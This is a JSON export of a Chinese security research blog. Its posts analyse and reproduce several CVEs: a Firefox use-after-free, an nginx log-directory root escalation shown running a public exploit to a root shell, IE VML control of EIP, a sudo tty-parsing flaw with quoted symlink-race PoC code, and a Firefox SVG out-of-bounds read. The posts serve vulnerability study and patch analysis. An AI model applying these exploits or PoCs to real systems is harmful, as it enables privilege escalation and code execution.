{"pages":[{"title":"","text":"google-site-verification: google5ba81ab67773ccd6.html","link":"/google5ba81ab67773ccd6.html"},{"title":"about","text":"","link":"/about/index.html"}],"posts":[{"title":"5gallinone","text":"做了大半年的LTE/5G相关，算是基本入门了。因为概念、内容比较多，整个经历比较痛苦。一开始啃文档，实在看不懂+看不下去。转而看论文，舒服了很多，再转向文档也清晰了很多。后续可以捣鼓sdr，在看完文档后调sdr简直太舒服了，尽管oai的代码风格，一言难尽。。。 整个过程比较常规： 网络整体架构+控制面消息+历史研究+协议标准捡漏+sdr实验验证。 将以前的部分内容用空余时间给整理了一下。慢慢整理。 目录 5G安全-概念之TATAI 5G安全-发现的几个小问题 5G安全-RRCConnectionRelease Redirected分析","link":"/2020/09/24/5gallinone/"},{"title":"about ActiveX","text":"ActiveX?最近准备调一下ActiveX相关的溢出的洞, 先了解一下ActiveX控件的相关知识简单说是ActiveX控件是一个集合, 一个ActiveX控件类似于一个dll, ActiveX控件用户可以开发, 也可以调用其接口使用.","link":"/2016/12/11/About-ActiveX/"},{"title":"CVE-2016-9899 分析与利用","text":"UAF元素创建 分配了多大内存, 一般静态分析（用于后面的占位）元素释放重用 一般来说　开启hpa ust能够追踪到异常 内存的创建，释放 重用 过程 直接断点 所有创建 的元素 与 后面重用的元素对象的地址 来判断 是那个对象 的UAF crash info123456789101112130:000:x86&gt; reax=13768c00 ebx=00000000 ecx=0018de68 edx=4543484f esi=0018de84 edi=110d2e80eip=02bfc44c esp=0018de58 ebp=0018de6c iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210206xul!nsCOMPtr&lt;nsIContent&gt;::nsCOMPtr&lt;nsIContent&gt;+0x1d:02bfc44c ff12 call dword ptr [edx] ds:002b:4543484f=????????0:000:x86&gt; kbChildEBP RetAddr Args to Child 0018de6c 0318df89 13768c00 00000003 0018dea8 xul!nsCOMPtr&lt;nsIContent&gt;::nsCOMPtr&lt;nsIContent&gt;+0x1d [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\obj-firefox\\dist\\include\\nscomptr.h @ 504]0018de7c 02d2fa21 00000000 00000000 0ed14400 xul!nsPluginFrame::BeginSwapDocShells+0xf [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\layout\\generic\\nspluginframe.cpp @ 1796]0018dea8 02dcf404 0318df7a 00000000 110d2760 xul!nsIDocument::EnumerateActivityObservers+0x33 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\dom\\base\\nsdocument.cpp @ 10246]0018dec4 02dcf3a6 11402800 00000000 110e0058 xul!BeginSwapDocShellsForDocument+0x42 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\layout\\generic\\nssubdocumentframe.cpp @ 1100]0018dedc 02dcf2ab 110dfd90 110e01a8 110e0058 xul!BeginSwapDocShellsForViews+0x1e [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\layout\\generic\\nssubdocumentframe.cpp @ 1112] 12345678/*static*/ voidnsPluginFrame::BeginSwapDocShells(nsISupports* aSupports, void*){ NS_PRECONDITION(aSupports, &quot;&quot;); nsCOMPtr&lt;nsIContent&gt; content(do_QueryInterface(aSupports)); //在这里调用 构造函数 if (!content) { return; } createhttps://github.com/jostw/gecko 确定元素创建的函数1234567891011121314151617180:000:x86&gt; x xul!*document*createElement*04d17284 xul!mozilla::dom::DocumentBinding::createElementNS_methodinfo = struct JSJitInfo04d16cd8 xul!mozilla::dom::DocumentBinding::createElement_methodinfo = struct JSJitInfo02cf93f8 xul!mozilla::dom::XULDocument::CreateElementFromPrototype (void)0409cc55 xul!mozilla::dom::XULDocument::CreateElement (void)0409cc55 xul!nsHTMLDocument::CreateElement (void)02e3891e xul!mozilla::dom::DocumentBinding::createElementNS (void)039aebb5 xul!nsDocument::CreateElement (void)030ac339 xul!nsDocument::CreateElement (void)030ac1ff xul!mozilla::dom::DocumentBinding::createElement (void)03e25609 xul!mozilla::dom::XULDocument::CreateElementNS (void)03e25609 xul!nsHTMLDocument::CreateElementNS (void)039aec70 xul!nsDocument::CreateElementNS (void)02e38bf5 xul!nsDocument::CreateElementNS (void)03265ce4 xul!mozilla::dom::XULDocument::CreateElement = &lt;no type information&gt;03260950 xul!nsHTMLDocument::CreateElement = &lt;no type information&gt;0326095d xul!nsHTMLDocument::CreateElementNS = &lt;no type information&gt;03265cf1 xul!mozilla::dom::XULDocument::CreateElementNS = &lt;no type information&gt;核心函数ur继续查看反汇编代码uf查看整个函数反汇编代码ub以该地址为结束地址第一个1nsCOMPtr&lt;Element&gt; element = CreateElement(aTagName, options, rv);第二个12RefPtr&lt;Element&gt; elem = CreateElem( needsLowercase ? lcTagName : aTagName, nullptr, mDefaultElementType, is);找到对应汇编函数偏移 设置断点确定为 第二个 地址偏小的一个1230:000:x86&gt; bl 0 e x86 039aec0e 0001 (0001) 0:**** xul!nsDocument::CreateElement+0x59 &quot;dps poi(eax); .echo &apos;----------&apos;; gc&quot; 1 e x86 030ac415 0001 (0001) 0:**** xul!nsDocument::CreateElement+0xdc &quot;dps poi(eax); .echo &apos;----------&apos;; gc&quot;运行后拿到信息123456789101112131415161718&apos;----------&apos;13768c00 0506b070 xul!mozilla::dom::HTMLAudioElement::`vftable&apos;13768c04 050975d8 xul!mozilla::dom::HTMLAudioElement::`vftable&apos;13768c08 0000000013768c0c 0010000013768c10 1010ea1013768c14 0000000013768c18 00020008 VCRUNTIME140!__ImageBase+0x813768c1c 0000000013768c20 0000000013768c24 0000000013768c28 13768c0013768c2c 0000000013768c30 0000000513768c34 0000000013768c38 00020000 VCRUNTIME140!__ImageBase13768c3c 0000040013768c40 0506c05c xul!mozilla::dom::HTMLAudioElement::`vftable&apos;1234560:000:x86&gt; reax=13768c00 ebx=00000000 ecx=0018de68 edx=4543484f esi=0018de84 edi=110d2e80eip=02bfc44c esp=0018de58 ebp=0018de6c iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210206xul!nsCOMPtr&lt;nsIContent&gt;::nsCOMPtr&lt;nsIContent&gt;+0x1d:02bfc44c ff12 call dword ptr [edx] ds:002b:4543484f=????????对比一下可知 前面申请的地址是 13768c00，后面重使用的是eax=13768c00，因此应该是HTMLAudioElement对象释放后重用 继续跟到blbl 利用浏览器UAF基本利用方法是，在释放之后申请一块相同大小的内存占位，从而在重用时控制EIP，然后可以通过堆喷射绕过ASLR，使用ROP绕过DEP。 占位堆喷射ROP","link":"/2017/03/27/CVE-2016-9899/"},{"title":"CVE-2012-4792 分析与利用","text":"","link":"/2017/02/18/CVE-2012-4792/"},{"title":"CVE-2016-1247 nginx提权环境搭建","text":"nginx 提权漏洞只是一个复现的过程，环境搭建。具体分析见创宇的一篇文章，写的很详细。http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/ 安装说明12ubuntu 14.04 32bitnginx 1.4.6-1ubuntu3参考：http://bbs.77169.com/forum.php?mod=viewthread&amp;tid=355577 安装过程首先尝试安装nginx 1.4.6-1ubuntu3，但是报错。1234567891011121314151617nginx@ubuntu:~$ sudo apt-get install nginx=1.4.6-1ubuntu3Reading package lists... DoneBuilding dependency tree Reading state information... DoneSome packages could not be installed. This may mean that you haverequested an impossible situation or if you are using the unstabledistribution that some required packages have not yet been createdor been moved out of Incoming.The following information may help to resolve the situation:The following packages have unmet dependencies: nginx : Depends: nginx-core (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installed or nginx-full (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installed or nginx-light (&lt; 1.4.6-1ubuntu3.1~) but 1.4.6-1ubuntu3.7 is to be installed or nginx-extras (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installed or nginx-naxsi (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installedE: Unable to correct problems, you have held broken packages. 因此安装一下nginx-full=1.4.6-1ubuntu312345678910111213nginx@ubuntu:~$ sudo apt-get install nginx-full=1.4.6-1ubuntu3Reading package lists... DoneBuilding dependency tree Reading state information... DoneSome packages could not be installed. This may mean that you haverequested an impossible situation or if you are using the unstabledistribution that some required packages have not yet been createdor been moved out of Incoming.The following information may help to resolve the situation:The following packages have unmet dependencies: nginx-full : Depends: nginx-common (= 1.4.6-1ubuntu3) but 1.4.6-1ubuntu3.7 is to be installedE: Unable to correct problems, you have held broken packages. 因此安装步骤123sudo apt-get install nginx-common=1.4.6-1ubuntu3sudo apt-get install nginx-full=1.4.6-1ubuntu3sudo apt-get install nginx=1.4.6-1ubuntu3安装版本为1234nginx@ubuntu:~$ dpkg -l |grep nginxii nginx 1.4.6-1ubuntu3 all small, powerful, scalable web/proxy serverii nginx-common 1.4.6-1ubuntu3 all small, powerful, scalable web/proxy server - common filesii nginx-full 1.4.6-1ubuntu3 i386 nginx web/proxy server (standard version) 查看文件夹权限12nginx@ubuntu:/var/log$ ls -ld ./nginx/drwxr-x--- 2 www-data adm 4096 May 15 05:41 ./nginx/属于www-data用户的 说明是没有补丁的。 运行&amp;复现nginx运行1234567nginx@ubuntu:~$ sudo nginxnginx@ubuntu:~$ ps -A |grep nginx10354 ? 00:00:00 nginx10355 ? 00:00:00 nginx10356 ? 00:00:00 nginx10357 ? 00:00:00 nginx10358 ? 00:00:00 nginx查看log/nginx文件夹下文件权限。123456nginx@ubuntu:/var/log/nginx$ lltotal 8drwxr-x--- 2 www-data adm 4096 May 15 06:04 ./drwxrwxr-x 15 root syslog 4096 May 15 05:46 ../-rw-r--r-- 1 root root 0 May 15 06:04 access.log-rw-r--r-- 1 root root 0 May 15 06:04 error.logerror.log是root用户并且属于root用户组的。若是属于www-data用户的话，可以先kill掉nginx，然后删除nginx文件夹下的所有文件；然后重启nginx即可。 切换至www-data下因此是no-login状态，所以不能直接切换，需要修改。123nginx@ubuntu:/var/log/nginx$ gedit /etc/passwd### to /bin/bashwww-data:x:33:33:www-data:/var/www:/bin/bash切换123456nginx@ubuntu:~/Desktop$ suPassword: root@ubuntu:/home/nginx/Desktop# sudo www-datasudo: www-data: command not foundroot@ubuntu:/home/nginx/Desktop# su www-datawww-data@ubuntu:/home/nginx/Desktop$ 执行PoC1234567891011121314www-data@ubuntu:/home/nginx/Desktop$ ./nginxed-root.sh /var/log/nginx/error.log [......][+] Starting the exploit as: uid=33(www-data) gid=33(www-data) groups=33(www-data)[+] Compiling the privesc shared library (/tmp/privesclib.c)[+] Backdoor/low-priv shell installed at: -rwxr-xr-x 1 www-data www-data 986672 May 15 06:11 /tmp/nginxrootsh[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: lrwxrwxrwx 1 www-data www-data 18 May 15 06:11 /var/log/nginx/error.log -&gt; /etc/ld.so.preload[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...切换至root权限下，强制log回滚1root@ubuntu:/var/log/nginx# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx拿到root权限12345678910111213141516171819202122232425262728[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: lrwxrwxrwx 1 www-data www-data 18 May 15 06:11 /var/log/nginx/error.log -&gt; /etc/ld.so.preload[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: -rw-r--r-- 1 www-data root 19 May 15 06:12 /etc/ld.so.preload[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload[+] The /etc/ld.so.preload file now contains: /tmp/privesclib.so[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!-rwsrwxrwx 1 root root 986672 May 15 06:11 /tmp/nginxrootsh[+] Rootshell got assigned root SUID perms at: -rwsrwxrwx 1 root root 986672 May 15 06:11 /tmp/nginxrootshThe server is (N)jinxed ! ;) Got root via Nginx![+] Spawning the rootshell /tmp/nginxrootsh now! nginxrootsh-4.3# nginxrootsh-4.3# nginxrootsh-4.3# whoamiroot 进一步了解该漏洞参考https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.htmlhttp://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/","link":"/2017/05/15/CVE-2016-1247/"},{"title":"CVE-2013-2551分析","text":"调试前分析用的PoC来自于泉哥的漏洞战争一书。PoC见文章最后。跟着PoC走一遍，crashme函数中基本都是在对v:stroke在进行处理，包括对其dashstyle属性的操作，Google一下v:stroke msdn，该部分属于VML（矢量标记语言），类似于IE中的画笔，绘制图形之类的。 环境win7 sp1 32IE8 8.0.7601.17514IS在已经装了IE11的机器上卸载更新达到IE8后，表示无法触发Crash（建议使用一个纯IE测试） 分析其实这个PoC已经能够很明显控制到EIP了，1234567890:022&gt; g(b14.d40): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=0185cda8 ebx=04e4a654 ecx=01852988 edx=4b5f5f4b esi=0185ce28 edi=04e4a6dceip=69104ea7 esp=04e4a52c ebp=04e4a53c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246jscript!CScriptRuntime::GetVarVal+0x6c:69104ea7 8b5270 mov edx,dword ptr [edx+70h] ds:0023:4b5f5fbb=????????发现是在访问edx+70h时出现错误，而edx+70h = 4b5f5fbb, edx为4b5f5f4b，跟到PoC发现这正是PoC中所赋值的内容：1shape.dashstyle.array.item(0x2E+0x16+i) = 0x4b5f5f4b;说明此时的edx可控，然后可以发现后面将会call edx123456769104e9f 8b4808 mov ecx,dword ptr [eax+8]69104ea2 8b4508 mov eax,dword ptr [ebp+8]69104ea5 8b11 mov edx,dword ptr [ecx]69104ea7 8b5270 mov edx,dword ptr [edx+70h] ds:0023:4b5f5fbb=????????69104eaa 50 push eax69104eab 53 push ebx69104eac ffd2 call edx因此我们在指定的一个内存区域覆盖我们的shellcode，然后将该地址-70h赋值给shape.dashstyle.array.item，在执行后面的call之后就能够达到任意代码执行。","link":"/2017/03/10/CVE-2013-2551/"},{"title":"CVE-2017-1000367 分析与复现","text":"这个漏洞是在5.30号正式公布的，国内有很多文章有关于该漏洞的预警，也就是介绍下影响范围，版本之类的信息，而且基本都是一份的各种转载。在freebuf上有一个比较详细的介绍，但是也主要是以翻译为主，并未讲的很透彻。http://www.freebuf.com/vuls/136156.html 因此准备对这个漏洞进行分析，并依据github上公布的PoC对该漏洞复现。主要解决两个问题： 造成该漏洞的原因是什么? 补丁如何修补 利用该漏洞能够达到怎样的效果 漏洞成因与补丁修复原因是在Linux执行sudo操作的时候，需要获取进程的tty设备号，而获取的地方是在/proc/[pid]/stat文件下。stat文件的详细描述在http://blog.csdn.net/cybertan/article/details/7596633 这篇博客中有很详细的描述。其中我们比较关系的是两点，一是这里面的值都是一项一项的，并且每一项都是使用空格进行分隔开。二是第二项表示 应用程序(进程)的名字，是用小括号包含，并且允许空格的存在；第七项是tty_nr，就是前面提到需要获取的tty设备号。漏洞成因就在获取tty设备号的时候：https://bugzilla.redhat.com/attachment.cgi?id=1282109 (补丁前后对比的代码)使用的函数为get_process_ttyname，关键代码如下：123456789101112131415161718 len = getline(&amp;line, &amp;linesize, fp); fclose(fp); if (len != -1) {- /* Field 7 is the tty dev (0 if no tty) */- char *cp = line;- char *ep = line;- const char *errstr;- int field = 0;- while (*++ep != &apos;\\0&apos;) {- if (*ep == &apos; &apos;) {- *ep = &apos;\\0&apos;;- if (++field == 7) {- dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;errstr);- if (errstr) {- sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,- &quot;%s: tty device %s: %s&quot;, path, cp, errstr);[......]- cp = ep + 1;基本流程为从 stat文件下读取一行(tty设备号在第一行)，然后按照空格取值，当遇到第七个空格的时候，那么前面那个记录的cp指针指向的就是tty设备号了，然后将其拿出来即可获取。而成功的前提在于前面只有用于分隔的空格，项中是没有空格的，而第二项的进程名中是允许包含空格的，而这一项是我们可以控制的。所以我们可以通过给第二项添加空格，来控制第七项的值，因此我们能够随意控制tty设备号。这是第一个问题点所在。所以对应的补丁就修补了查询方式： 1234567891011121314151617181920212223242526+ /*+ * Field 7 is the tty dev (0 if no tty).+ * Since the process name at field 2 &quot;(comm)&quot; may include spaces,+ * start at the last &apos;)&apos; found.+ */+ char *cp = strrchr(line, &apos;)&apos;);+ if (cp != NULL) {+ char *ep = cp;+ const char *errstr;+ int field = 1;++ while (*++ep != &apos;\\0&apos;) {+ if (*ep == &apos; &apos;) {+ *ep = &apos;\\0&apos;;+ if (++field == 7) {+ dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;errstr);+ if (errstr) {+ sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,+ &quot;%s: tty device %s: %s&quot;, path, cp, errstr);+ }+ if (tdev &gt; 0) {+ errno = serrno;+ ret = sudo_ttyname_dev(tdev, name, namelen);+ goto done;+ }+ break;主要的添加代码，在对第七项的查询时，通过进程名项使用小括号包着的特点，从’)’往后开始查询。 看到前面链接中的代码，其实还补了另外一处：1234567 static char *ignore_devs[] = { &quot;/dev/fd/&quot;,+ &quot;/dev/mqueue/&quot;,+ &quot;/dev/shm/&quot;, &quot;/dev/stdin&quot;, &quot;/dev/stdout&quot;, &quot;/dev/stderr&quot;,这就和后面的利用有关系了，获取设备号后处理流程，当获取到一个不为0的设备号后，即认为是存在tty设备的，此时将调用sudo_ttyname_dev函数依据设备号去搜索指定的设备名。搜索顺序是首先在search_devs数组中包含的路径下搜索，若不存在，将在/dev路径下进行广度优先搜索。详细可见：https://github.com/Distrotech/sudo/blob/master/src/ttyname.c 的sudo_ttyname_dev(dev_t rdev)函数，代码比较简单。 我在centos 7上查看了dev文件夹下的权限情况。12345678[root@localhost dev]# ls -lddrwxr-xr-x. 20 root root 3280 Jun 5 02:14 .[root@localhost dev]# ls -ld shm/drwxrwxrwt. 2 root root 180 Jun 5 04:30 shm/[root@localhost dev]# ls -ld mqueue/drwxrwxrwt. 2 root root 40 Jun 5 2017 mqueue/其中 shm和mqueue文件夹是普通用户可写，那么也就意味着当我们设置为一个不存在的tty设备号的时候，通过对/dev文件夹进行搜索时，能够触碰到我们自己创建的文件。所以第二个修补位置就是添加了两个忽视搜索的路径，即shm和mqueue文件夹不放置在搜索路径下。 漏洞影响和复现freebuf上给的标题为SELinux曝新安全漏洞：用户执行sudo命令可获取root权限其实很多时候不是很明确sudo和root之间的区别，尤其是在ubuntu上默认用户安装的时候，sudo之后的用户基本上和root是一个权限。但是在包含SELinux的Linux系统中，sudo获取的权限和root的差异很明显，尤其是在使用centos的时候差异很明显。详细可以参考：http://www.jb51.net/LINUXjishu/12713.html简单描述为，普通用户使用sudo执行命令流程是当前用户切换到root，然后以root的身份执行命令，执行完成后再次回到当前用户。权限问题：普通用户的sudo权限是root给定的，root决定普通用户能够使用sudo执行哪些操作。具体的设置在/etc/sudoers文件下，如添加一条123456## Allows members of the users group to shutdown this system# %users localhost=/sbin/shutdown -h now## Read drop-in files from /etc/sudoers.d (the # here does not mean a comment)#includedir /etc/sudoers.dcentos ALL=(ALL) NOPASSWD: /usr/bin/sum那么centos用户能够执行sudo，但是只能执行sum命令123456[centos@localhost ~]$ sudo vim /etc/passwd[sudo] password for centos: Sorry, user centos is not allowed to execute &apos;/bin/vim /etc/passwd&apos; as root on localhost.localdomain.[centos@localhost ~]$ sudo sum /etc/passwd11634 3[centos@localhost ~]$废话少说了，入正题：漏洞效果怎样？因为是通过sudo命令对get_process_ttyname函数执行的，因此利用该漏洞前提是能够拿到一个用户的sudo权限，而在使用了SELinux的系统中，会将标准输入输出(stdout, stderr, stdin)信息写入到文件之中，这个文件是当前进程所对应的虚拟终端的文件。（使用sudo -r unconfined_r能够触发）（这里因为不是很了解，描述比较模糊，详细可参考SELinux的一些处理）。因此当我们能够控制这个文件，就能够控制对任意文件的写入，因为这个写入操作也是在root权限下，所以能够对敏感文件写入，如/etc/sudoers。所以该漏洞的利用效果为，能够将一个用于sudo权限的用户提升到root权限。因为github找到了PoC，能够实现任意文件的写入，并且也测试成功，因此将依据该PoC来介绍下如何提权。https://github.com/c0d3z3r0/sudo-CVE-2017-1000367/blob/master/sudopwn.c12345mkdir(&quot;/dev/shm/_tmp&quot;, 0755);symlink(&quot;/dev/pts/57&quot;, &quot;/dev/shm/_tmp/_tty&quot;);symlink(&quot;/usr/bin/sudo&quot;, &quot;/dev/shm/_tmp/ 34873 &quot;);[......]execlp(&quot;/dev/shm/_tmp/ 34873 &quot;, &quot;sudo&quot;, &quot;-r&quot;, &quot;unconfined_r&quot;, &quot;/usr/bin/sum&quot;, &quot;--\\nHELLO\\nWORLD\\n&quot;, NULL);首先是创建一下符号链接了，先看第二个，第一个的作用将在后面描述。因为将/dev/shm/_tmp/ 34873 链接到sudo了，所以执行它的时候也会调用漏洞函数get_process_ttyname，使用execlp执行，那么就能够把我们的34873写入到第七项tty设备号中了，下次获取的时候就是通过34873来调用sudo_ttyname_dev来查询了，因为这个是我们写入的一个不存在的tty设备号，那么在search_devs[]数组中是找不到的，因此需要去/dev文件夹下搜索，此时添加一个消息反馈，当搜索到我们创建的文件夹/dev/shm/_tmp的时候给予消息，即1wd = inotify_add_watch( fd, &quot;/dev/shm/_tmp&quot;, IN_OPEN | IN_CLOSE_NOWRITE );~ 当接受到消息的时候，打开文件夹，将对里面进行搜索，那么将会触发到我们设置的第一个符号链接，链接到”/dev/pts/57”，这个也是不存在，但是符号链接，等同于Linux下的ld -s命令，链接双方只要有一个变化，另一个也会发生变化，那么本来链接到空，触发第一个符号链接时将创建”/dev/pts/57”（这个在centos下使用ld -s测试成功）。此时接着是一个循环执行openpty，尝试获取一个可用的虚拟终端，当其创建之后，那么一定能够获取到，并给当前进程使用，也就是前面提到的SELinux 将会吧标准输入输出写入到这里。因此在该文件搜索结束之后，触发CLOSE，把链接的文件修改了我们需要控制的文件，那么当有标准输入输出的时候将会输出到这个文件下。 (这里描述有误 感谢@XiaoHuaMe) 当打开/dev/shm/_tmp 文件夹时，触发消息，将进入父进程，并终止子进程；此时使用openpty循环获取可用的虚拟终端。前面对于openpty的理解存在错误，假设/dev/pts目录下只有0和1，那么此时应该都在被占用状态，下一个可用的将会是2，可以在openpty后面加一个while(1);发现在/dev/pts目录下创建了2，那么此时将进入while循环。123while(strcmp(pts_path,&quot;/dev/pts/57&quot;)){ openpty(&amp;master, &amp;slave, &amp;pts_path[0], NULL, NULL); };然后会继续出现3，4，直到57的存在。(58是因为我新开了一个终端查看pts)1234[centos@localhost ~]$ ls /dev/pts/0 11 14 17 2 22 25 28 30 33 36 39 41 44 47 5 52 55 58 81 12 15 18 20 23 26 29 31 34 37 4 42 45 48 50 53 56 6 910 13 16 19 21 24 27 3 32 35 38 40 43 46 49 51 54 57 7 ptmx还有另一个点，device name为 34873，那么需要查找的pty为57（这里并未找到权威的说明，望大家指正^^）作者的描述如下：12and a symlink &quot;/dev/shm/_tmp/_tty&quot; to a non-existent pty &quot;/dev/pts/57&quot;, whose device number is 34873;此时已经创建了57，那么唤醒子进程，继续搜索，将按照符号链接找到57，并返回设备名为对应的符号链接（/dev/shm/_tmp/_tty）。此时再修改符号链接指向，而SELinux将按照这个符号链接的指向文件进行标准输入输出的写入。 这里利用的是stderr；因此能够达到任意文件写入。12345678910111213141516171819if ( event-&gt;mask &amp; IN_OPEN ) { //kill(pid, SIGSTOP); while(strcmp(pts_path,&quot;/dev/pts/57&quot;)){ openpty(&amp;master, &amp;slave, &amp;pts_path[0], NULL, NULL); }; //kill(pid, SIGCONT); break; }else if ( event-&gt;mask &amp; IN_CLOSE_NOWRITE ) { //kill(pid, SIGSTOP); unlink(&quot;/dev/shm/_tmp/_tty&quot;); symlink(&quot;/etc/motd&quot;, &quot;/dev/shm/_tmp/_tty&quot;); //kill(pid, SIGCONT); state = 1; break; }主要模糊点，是在SELinux所默认OPEN写入的文件的问题。作者的描述为：12because relabel_tty() (in src/selinux.c) calls open(O_RDWR|O_NONBLOCK)on his tty and dup2()s it to the command&apos;s stdin, stdout, and stderr. 参考链接http://www.openwall.com/lists/oss-security/2017/05/30/16https://www.sudo.ws/alerts/linux_tty.htmlhttps://github.com/jihadLkmaty218/CVE-2017-1000367/blob/master/sudopwn.chttps://bugzilla.redhat.com/show_bug.cgi?id=1453074https://github.com/Distrotech/sudo/blob/master/src/ttyname.chttp://blog.csdn.net/cybertan/article/details/7596633http://www.jb51.net/LINUXjishu/12713.html openptyhttp://blog.sina.com.cn/s/blog_8b3afa210100t9v3.html","link":"/2017/06/06/CVE-2017-1000367/"},{"title":"CVE-2017-5465 Firefox ConvolvePixel 函数内越界读","text":"基本信息 SVG相关漏洞 发现者：ifratric (Project Zero) PoC123&lt;svg filter=&quot;url(#f)&quot;&gt;&lt;filter id=&quot;f&quot; filterRes=&quot;19&quot; filterUnits=&quot;userSpaceOnUse&quot;&gt;&lt;feConvolveMatrix kernelMatrix=&quot;1 1 1 1 1 1 1 1 1&quot; kernelUnitLength=&quot;1 -1&quot; /&gt; feConvolveMatrix是SVG的一个滤镜元素，设置滤镜的一些效果。filter标签用来定义滤镜 图形元素对滤镜的引用，给图形添加滤镜1&lt;image xlink:href=&quot;xxx.jpg&quot; width=&quot;400&quot; height=&quot;500&quot; filter=&quot;url(#f)&quot;/&gt; 出错的点在于feConvolveMatrix元素中的kernelUnitLength属性值的处理。kernelUnitLength in W3C: The first number is the value. The second number is the value. A negative or zero value is an error 默认设置为1 112345678910111213141516SizensSVGFE::GetKernelUnitLength(nsSVGFilterInstance* aInstance, nsSVGNumberPair *aKernelUnitLength){ if (!aKernelUnitLength-&gt;IsExplicitlySet()) { return Size(1, 1); // 默认设置为(1, 1) } float kernelX = aInstance-&gt;GetPrimitiveNumber(SVGContentUtils::X, aKernelUnitLength, nsSVGNumberPair::eFirst); float kernelY = aInstance-&gt;GetPrimitiveNumber(SVGContentUtils::Y, aKernelUnitLength, nsSVGNumberPair::eSecond); return Size(kernelX, kernelY);} 因为默认 kernelUnitLength 指定为正数，而Firefox缺少对kernelUnitLength中的值检查，当传入负数(没有仔细去分析大小的计算，0或者也可以导致越界？)时，导致数组分配过小，从而在渲染时进行数组操作时所访问的位置大于数组分配的大小，从而导致越界读。 patch 补丁其实就是直接加了一个判断，过滤掉非正数的传入。 GetPrimitiveDescription从Patch入手，在输入一个样本后，首先是从DOM树的构建过程，将需要获取元素所可能的属性以及属性值，并进行存储。这里对应的滤镜元素feConvolveMatrix，而它的处理接口为SVGFEConvolveMatrixElement.cpp，因此对应如下代码：1234567891011121314151617181920212223242526272829FilterPrimitiveDescriptionSVGFEConvolveMatrixElement::GetPrimitiveDescription(nsSVGFilterInstance* aInstance, const IntRect&amp; aFilterSubregion, const nsTArray&lt;bool&gt;&amp; aInputsAreTainted, nsTArray&lt;RefPtr&lt;SourceSurface&gt;&gt;&amp; aInputImages){..... Size kernelUnitLength = GetKernelUnitLength(aInstance, &amp;mNumberPairAttributes[KERNEL_UNIT_LENGTH]); // 补丁位置 if (kernelUnitLength.width &lt;= 0 || kernelUnitLength.height &lt;= 0) { // According to spec, A negative or zero value is an error. See link below for details. // https://www.w3.org/TR/SVG/filters.html#feConvolveMatrixElementKernelUnitLengthAttribute return failureDescription; } // 将元素的各个属性以及值存储起来 FilterPrimitiveDescription descr(PrimitiveType::ConvolveMatrix); AttributeMap&amp; atts = descr.Attributes(); atts.Set(eConvolveMatrixKernelSize, IntSize(orderX, orderY)); atts.Set(eConvolveMatrixKernelMatrix, &amp;kernelMatrix[0], kmLength); atts.Set(eConvolveMatrixDivisor, divisor); atts.Set(eConvolveMatrixBias, bias); atts.Set(eConvolveMatrixTarget, IntPoint(targetX, targetY)); atts.Set(eConvolveMatrixEdgeMode, edgeMode); atts.Set(eConvolveMatrixKernelUnitLength, kernelUnitLength); // eConvolveMatrixKernelUnitLength = 0x18 atts.Set(eConvolveMatrixPreserveAlpha, preserveAlpha);这里的属性则是kernelUnitLength，获取其值之后，并存储到AttributeMap中，对应属性和属性值对，而补丁处则对该值进行了一次正数判断。 调试进入后值的情况。1234567891011121314151617xul!mozilla::dom::SVGFEConvolveMatrixElement::GetPrimitiveDescription+0x209:63c105f1 e8b5870100 call xul!nsSVGFE::GetKernelUnitLength (63c28dab)0:000&gt; peax=002cc908 ebx=00000003 ecx=002cc89c edx=00000009 esi=0ed76d30 edi=14cb6a00eip=63c105f6 esp=002cc8d0 ebp=002cc9b4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246xul!mozilla::dom::SVGFEConvolveMatrixElement::GetPrimitiveDescription+0x20e:63c105f6 6a07 push 70:000&gt; dd eax002cc908 3f800000 bf800000 00000000 64e476d4002cc918 c1f0001d 0000000c 00000000 00000000002cc928 00000000 00000000 64ea41bc 00000000002cc938 00000000 00000000 00000000 00000000002cc948 00000000 00000000 00000000 64ea41bc002cc958 00000000 002cc900 64ea41bc 00000000002cc968 0fcb2ec0 6294dc7a 00000010 002cc9dc002cc978 00000000 002cc9a0 00000008 62b60e5e3f800000 = 1.0, bf800000 = -1.0 存储之后，浏览器将继续处理，将进入渲染过程，而对于图像的处理将会进行卷积的计算，具体没查，这里可以网上搜索查看，也是图像处理的基础算法之一。而这里的处理则是在ConvolvePixel函数中体现。 ConvolvePixel12345678910111213141516171819202122232425262728293031323334353637383940414243template&lt;typename CoordType&gt;static voidConvolvePixel(const uint8_t *aSourceData, uint8_t *aTargetData, int32_t aWidth, int32_t aHeight, int32_t aSourceStride, int32_t aTargetStride, // aSourceStride=4d0 int32_t aX, 